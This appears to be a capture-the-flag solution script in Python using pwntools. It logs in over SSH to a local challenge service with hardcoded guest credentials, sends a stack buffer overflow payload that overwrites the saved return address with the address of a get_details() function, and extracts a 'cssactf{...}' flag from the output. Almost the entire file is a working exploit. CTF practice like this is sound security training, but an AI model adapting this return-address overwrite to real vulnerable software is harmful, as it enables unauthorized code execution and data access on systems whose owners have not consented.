#!/usr/bin/env python3
from pwn import *

# Set binary context
context.binary = exe = ELF('../code/bin/public/client', checksec=False)

# Get the address of get_details()
get_details = exe.symbols['get_details']
print(f"get_details() found at: {hex(get_details)}")

# Construct payload
payload = b"A" * 32  # Fill buffer
payload += b"B" * 8   # Overwrite saved RBP
payload += p64(get_details);

# Connect via SSH and initiate interactive "shell"
p = ssh("guest", "localhost", password="ctf2025!", port=30202, timeout=5, raw=True)
io = p.shell()

# Wait until the server is ready for a command
io.recvuntil(b'Enter a command: ')

# Start by ensuring the global variables are set to month = 2 and year = 2025
io.sendline(b"details 2 2025")

# Wait until the command is processed
io.recvuntil(b'Enter a command: ')

# Send our overflow payload
io.sendline(payload)

# Scan the output for the flag and output
match = io.recvregex(br"cssactf{.*}", capture=True)
print(f"GOT FLAG: {match.group(0).decode()}")

# Process will crash, wait for that and then close the connection.
io.close()
